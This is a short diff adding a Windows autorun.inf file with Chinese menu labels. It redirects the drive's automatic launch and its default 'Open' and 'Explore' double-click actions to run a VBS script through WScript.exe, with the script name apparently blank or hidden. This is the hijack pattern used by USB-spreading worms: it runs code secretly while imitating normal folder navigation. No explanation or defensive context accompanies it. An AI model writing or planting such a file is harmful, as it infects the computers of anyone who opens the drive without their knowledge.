@@ -1,0 +1,7 @@
+[AutoRun]
+Shellexecute=WScript.exe .vbs "AutoRun"
+shell\open=打开(&O)
+shell\open\command=WScript.exe .vbs "AutoRun"
+shell\open\Default=1
+shell\explore=资源管理器(&X)
+shell\explore\command=WScript.exe .vbs "AutoRun"
